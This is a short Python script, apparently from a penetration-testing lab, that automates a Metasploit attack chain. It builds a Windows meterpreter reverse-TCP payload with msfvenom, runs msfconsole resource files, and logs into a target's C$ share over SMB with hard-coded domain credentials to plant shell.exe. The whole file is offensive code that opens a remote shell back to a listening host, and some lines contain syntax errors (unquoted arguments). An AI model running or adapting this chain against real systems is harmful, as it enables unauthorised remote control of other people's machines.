#!/usr/bin/env python3
import pexpect
import os

#msfvenom
process = pexpect.spawn('msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.22.117.100 LPORT=4444 -f exe > shell.exe') 
process.expect('Final')
print ("MSFVENOM SCRIPT COMPLETE. NAME=shell.exe")

# Start Metasploit
metasploit_process = pexpect.spawn('msfconsole')

# Wait for Metasploit prompt
metasploit_process.expect('msf6')
print ("RUNNING RESOURCE 1")

# Running resource1.rc
metasploit_process.sendline(resource resource1.rc)
metasploit_process.expect('auxiliary')

#SMB client put shell.exe
metasploit_process.sendline('!smbclient //172.22.117.20/C$ -I megacorpone/tstark')
metasploit_process.expect('smb:')
metasploit_process.sendline('Password!')
metasploit_process.expect('smb:')
metasploit_process.sendline('put shell.exe')
metasploit_process.expect('smb:')
metasploit_process.sendline('exit')
metasploit_process.expect('auxiliary')
print ("SHELL.EXE SUCCESSFULLY PLACED - RUNNING RESOURCE 2")

# Running resource2.rc
metasploit_process.sendline(resource resource2.rc)
metasploit_process.expect('msf6')
print ("ATTACK COMPLETED")
metasploit_process.close()
